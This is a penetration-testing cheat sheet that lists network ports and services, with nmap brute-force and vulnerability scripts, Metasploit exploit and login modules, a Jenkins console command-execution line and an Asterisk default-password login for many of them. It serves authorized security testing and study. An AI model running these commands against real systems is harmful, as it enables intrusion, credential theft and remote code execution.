
# Ports

|**Port Number**|**Protocol**|**Service & Application**|**Commands**|
|:--------------|:-----------|:------------------------|:-----------|
|1|tcp|blackice||
|7|tcp|echo||
|11|tcp|systat||
|13|tcp|daytime||
|15|tcp|netstat||
|17|tcp|quote of the day||
|19|tcp|character generator||
|21|tcp|ftp|nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 *IP*|
|22|tcp|ssh|msf > use auxiliary/scanner/ssh/ssh_login<BR>nmap --script ssh2-enum-algos 192.168.108.197<BR>nmap --script ssh-hostkey *IP*<BR>nmap --script sshv1 192.168.108.197|
|23|tcp|telnet|msf > use auxiliary/scanner/telnet/telnet_login<BR>nmap -p 23 --script telnet-brute --script-args *IP* userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s *IP*<BR>nmap -p 23 --script telnet-encryption *IP*<BR>nmap -p 23 --script telnet-ntlm-info *IP*|
|25|tcp|smtp|nmap -p 25 --script smtp-brute *IP*<BR>nmap --script smtp-commands.nse [--script-args smtp-commands.domain=`domain`] -pT:25,465,587 *IP*<BR>nmap -p 25,465,587 --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=domain.com *IP*<BR>nmap --script smtp-open-relay.nse [--script-args smtp-open-relay.domain=`domain`,smtp-open-relay.ip=`address`,...] -p 25,465,587 *IP*<BR>nmap --script=smtp-vuln-cve2010-4344 --script-args="smtp-vuln-cve2010-4344.exploit" -pT:25,465,587 *IP*<BR>nmap --script=smtp-vuln-cve2010-4344 --script-args="exploit.cmd='uname -a'" -pT:25,465,587 *IP*<BR>nmap --script=smtp-vuln-cve2011-1720 --script-args='smtp.domain=`domain`' -pT:25,465,587 *IP*<BR>nmap --script=smtp-vuln-cve2011-1764 -pT:25,465,587 *IP*|
|26|tcp|ssh||
|37|tcp|rdate||
|49|tcp|TACACS+||
|53|tcp|dns||
|53|udp|dns||
|67|tcp|DHCP||
|68|tcp|dhclient||
|69|udp|TFTP,BitTorrent||
|70|tcp|Gopher||
|79|tcp|Finger||
|80|tcp|HTTP,malware||
|81|tcp|HTTP,malware||
|82|tcp|HTTP,malware||
|83|tcp|HTTP||
|84|tcp|HTTP||
|88|tcp|Kerberos|use auxiliary/admin/kerberos/ms14_068_kerberos_checksum|
|102|tcp|Siemens S7||
|110|tcp|pop3||
|111|tcp|RPC|rpcinfo -p 192.168.1.111<BR>msf >use auxiliary/scanner/nfs/nfsmount|
|119|tcp|NNTP||
|123|tcp|NTP||
|123|udp|ntp|ntpdc -n -c monlist *IP*<BR>nmap -sU -p 123 -Pn -n --script ntp-info *IP*<BR>nmap -sU -p 123 -Pn -n --script ntp-monlist *IP*<BR>msf > use auxiliary/scanner/ntp/ntp_readvar|
|137|tcp|NetBIOS|nbtscan -A *IP*|
|139|tcp|SMB|enum4linux -a *IP*<BR>rpcclient -U "" *IP* + srvinfo; enumdomusers; getdompwinfo; querydominfo; netshareenum; netshareenumall
|143|tcp|IMAP||
|161|udp|snmp|snmpcheck -p 161 -c public -t *IP*<BR>snmpwalk -v1 -c public *IP*<BR>msf > use auxiliary/scanner/snmp/snmp_enum|
|162|udp|snmp|
|175|tcp|IBM Network Job Entry||
|179|tcp|BGP||
|195|tcp|TA14-353a||
|264||Checkpoint Firewall||
|311|tcp|OS X Server Manager||
|389|tcp|ldap|ldap://*IP*/dc=com|
|443|tcp|https|openssl s_client -host www.yahoo.com -port 443<BR>sslscan www.yahoo.com<BR>tlssled www.yahoo.com 443<BR>nmap --script sslv2 www.yahoo.com<BR>nmap --script ssl-cert www.yahoo.com<BR>nmap --script ssl-date www.yahoo.com<BR>nmap --script ssl-enum-ciphers www.yahoo.com<BR>nmap --script ssl-google-cert-catalog www.yahoo.com<BR>msf > use auxiliary/pro/web_ssl_scan<BR>msf > use auxiliary/scanner/ssl/openssl_heartbleed<BR>msf > use auxiliary/server/openssl_heartbeat_client_memory|
|445|tcp|Microsoft-DS Active Directory, Windows shares<BR>Microsoft-DS SMB file sharing|smbclient -U root -L *IP*<BR>smbclient -U root //*IP*/tmp<BR>rpcclient -U "" *IP*<BR>msf > auxiliary/admin/smb/samba_symlink_traversal|
|465|tcp|smtps||
|500|udp|ike||
|502|tcp|modbus||
|503|tcp|modbus||
|512|tcp|||
|513|tcp|||
|514|tcp|||
|515|tcp|Line Printer Daemon||
|520|tcp|RIP||
|523|tcp|IBM DB2||
|554|tcp|RTSP||
|587|tcp|SMTP mail submission||
|623|tcp|IPMI||
|626|tcp|OS X serialnumbered||
|631|tcp|CUPS Service error||
|636|tcp|ldaps||
|771|tcp|Realport||
|789|tcp|Redlion Crimson3||
|873|tcp|rsync|rsync -a user@host::tools/<BR>nmap -p 873 --script rsync-brute --script-args 'rsync-brute.module=www' *IP*<BR>nmap -p 873 --script rsync-list-modules *IP*<BR>msf >use auxiliary/scanner/rsync/modules_list|
|902|tcp|VMware authentication||
|953||BIND Contorl Port||
|992|tcp|Telnet(secure)||
|993|tcp|IMAPs||
|995|tcp|POP3s||
|1023|tcp|telnet||
|1025|tcp|Kamstrup||
|1030|tcp|RPC||
|1032|tcp|RPC||
|1033|tcp|RPC||
|1038|tcp|RPC||
|1099|tcp|Remote Method invocation|use exploit/multi/misc/java_rmi_server|
|1194|tcp|openvpn||
|1200|tcp|Codesys||
|1234|udp|udpxy||
|1202|tcp|linknat||
|1433|tcp|MS-SQL|MSF>use auxiliary/scanner/mssql/mssql_ping |
|1434|udp|MS-SQL monitor||
|1521|tcp|Oracle| tnscmd10g version/status -h *IP*|
|1604||Citrix, malware||
|1723|tcp|pptp|thc-pptp-bruter -v -u `username` -n 4 *IP* < pass.txt|
|1741||CiscoWorks||
|1833||MQTT||
|1900|tcp|bes,UPnP||
|1911||Niagara Fox||
|1962||PCworx||
|2000||iKettle,MikroTik bandwidth test||
|2049|tcp|nfs|showmount --all *IP*<BR>showmount --exports *IP* <BR>mount -t nfs *IP*:/ /mnt/nfs/|
|2082|tcp|cpanel||
|2083|tcp|cpanel||
|2086||WHM||
|2087||WHM||
|2100|tcp|Oracel XML DB| [Default Username/Passwords](https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm)|
|2121|tcp|ftp|msf > use auxiliary/scanner/ftp/ftp_login|
|2123||GTPv1||
|2152||GTPv1||
|2182||Apache Zookeeper||
|2222|tcp|SSH, PLC5, EtherNet/IP||
|2323|tcp|telnet||
|2332|tcp|Sierra wireless(telnet)||
|2375||Docker||
|2376||Docker||
|2404||IEC-104||
|2455||CoDeSys||
|2480||OrientDB||
|2628||Dictionary||
|2967||Symantec System Center Alert Management System||
|3000||ntop||
|3128|tcp|squid||
|3299|tcp|sap|msf > use auxiliary/scanner/sap/sap_router_portscanner|
|3306|tcp|mysql|msf > auxiliary/scanner/mysql/mysql_login<BR>nmap --script mysql-brute *IP*<BR>nmap --script mysql-databases *IP*<BR>nmap -p 3306 --script mysql-dump-hashes *IP*<BR> --script-args='username=`username`,password=`password`' *IP*<BR>nmap -p 3306 --script mysql-enum *IP*<BR>nmap -p 3306 --script mysql-users *IP*<BR>nmap -p 3306 <ip> --script mysql-query --script-args='query="`query`"[,username=`username`,password=`password`] *IP*'|
|3310|tcp|ClamAV||
|3339|Oracle Web Interace||
|3386||GTPv1||
|3388||RDP||
|3389||RDP|rdesktop -u guest -p guest *IP* -g 94%<BR>rdp-sec-check *IP*|
|3541||PBX GUI||
|3542||PBX GUI||
|3632|tcp|distccd|msf > use exploit/unix/misc/distcc_exec |
|3689||DACP||
|3780||Metasploit||
|3787||Ventrilo||
|4022||udpxy||
|4369|tcp|Erlang Port Mapper Daemon|nmap -p 4369 --script epmd-info *IP*|
|4440|tcp|rundeck||
|4500||IKE NAT-T(VPN)||
|4567||Modem web interface||
|4070||VertX/Edge door controller||
|4800||Noxa Nport||
|4911||Niagara Fox with SSL||
|4949||Munin||
|5006||MELSEC-Q||
|5007||MELSEC-Q||
|5008||NetMobility||
|5009||Apple Aitport Administrator||
|5038|tcp|Asterisk Call Manager|http://code.google.com/p/sipvicious/<BR><BR>$ ncat -v 192.168.108.196 5038<BR>Ncat: Version 6.47 ( http://nmap.org/ncat )<BR>Ncat: Connected to 192.168.108.196:5038.<BR>Asterisk Call Manager/1.1<BR>action: login<BR>username: admin<BR>secret: amp111<BR><BR>Response: Success<BR>Message: Authentication accepted<BR>action: command<BR>command: core show help|
|5432|tcp|postgresql||
|5060|udp|sip|msf > use auxiliary/scanner/sip/options|
|5222||XMPP||
|5269||XMPP Server to Server||
|5353||mDNS||
|5357||Mirosoft-HTTP API/2.0||
|5432||Postgresql||
|5555|tcp|hp data protector|msf > use exploit/windows/misc/hp_dataprotector_cmd_exec|
|5577||Flux LED||
|5601|tcp|kibana||
|5632||PCAnywhere||
|5672||RabbitMQ||
|5900|tcp|vnc|msf > use auxiliary/scanner/vnc/vnc_none_auth<BR>msf > use auxiliary/scanner/vnc/vnc_login <BR>msf > use exploit/multi/vnc/vnc_keyboard_exec<BR>nmap --script vnc-brute -p 5900 <host><BR>nmap --script vnc-info -p 5900 <host>|
|5901||vnc||
|5938||TeamViewer||
|5984||CouchDB||
|5985|tcp|winrm|msf >use exploit/windows/winrm/winrm_script_exec<BR>msf >use auxiliary/scanner/winrm/winrm_auth_methods<BR>msf >use auxiliary/scanner/winrm/winrm_cmd<BR>msf >use auxiliary/scanner/winrm/winrm_login<BR>msf >use auxiliary/scanner/winrm/winrm_wql|
|6000|tcp|x11|xwd -root -screen -slient -display 192.168.1.108:0 > out.xwd<BR>convert out.xwd out.png|
|6379|tcp|redis|redis-cli -h 127.0.0.1 -p 6379<BR>msf >use auxiliary/scanner/redis/file_upload<BR>msf >use auxiliary/scanner/redis/redis_login<BR>use auxiliary/scanner/redis/redis_server|
|6380|tcp|redis||
|6082|tcp|varnish||
|6667|tcp|ircd backdoor|msf > use exploit/unix/irc/unreal_ircd_3281_backdoor|
|6881||BitTorrent||
|6969||TFTP,BitTorrent||
|7001|tcp|weblogic||
|8080|tcp|jekins|Jekins Console<BR>println "cmd.exe /c dir".execute().text<BR><BR>msf >use auxiliary/scanner/http/jenkins_enum<BR>msf >use exploit/multi/http/jenkins_script_console|
|8083|tcp|vestacp||
|8089|tcp|jboss||
|8101|tcp|apache karaf||
|8180|tcp|apache tomcat|msf > use exploit/multi/http/tomcat_mgr_deploy|
|8443|tcp|https||
|8443||Symantec SEP Manager||
|8554|tcp|rtsp||
|8649|tcp|ganglia||
|9009|tcp|Julia||
|9043|tcp|WebSpeher||
|9090||Symantec SEP Manager||
|9151|tcp|Tor Control||
|9160||Apache Cassandra||
|9200|tcp|elasticsearch|msf >use exploit/multi/elasticsearch/search_groovy_script|
|9418|tcp|git||
|10000|tcp|virtualmin/webmin||
|11211|tcp|memcache|msf > use auxiliary/gather/memcached_extractor<br>$ nc x.x.x.x 11211<BR>stats\r\n|
|12174|tcp|Symantec System Center Alert Management System||
|13579||Media Player classic web interface||
|17185||VxWorks WDBRPC||
|18083|tcp|vbox server||
|27017|tcp|mongodb|msf >use auxiliary/scanner/mongodb/mongodb_login<BR>$ mongo host:port/database<BR>MongoDB shell version: 2.6.12<BR>> help|
|28017|tcp|mongodb||
|37777||Dahua DVR||
|38292||Symantec System Center Alert Management System||
|44818||EtherNet/IP||
|49153||WeMo Link||
|50000|tcp|sap||
|50030|tcp|hadoop||
|50070|tcp|hadoop||
|51106||Deluge(HTTP)||
|54138||Toshiba PoS||
|55553||Metasploit||
|55554||Metasploit||
|62078||Apple iDevice||
|64738||Mumble||

# Links

1. http://www.rfc-editor.org/search/rfc_search.php
2. http://packetlife.net/
3. https://www.leanpub.com/shodan



Originally taken from: https://github.com/nixawk/pentest-wiki/blob/master/3.Exploitation-Tools/Network-Exploitation/ports_number.md
The MIT License (MIT)

Copyright (c) 2016 Vex Woo

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.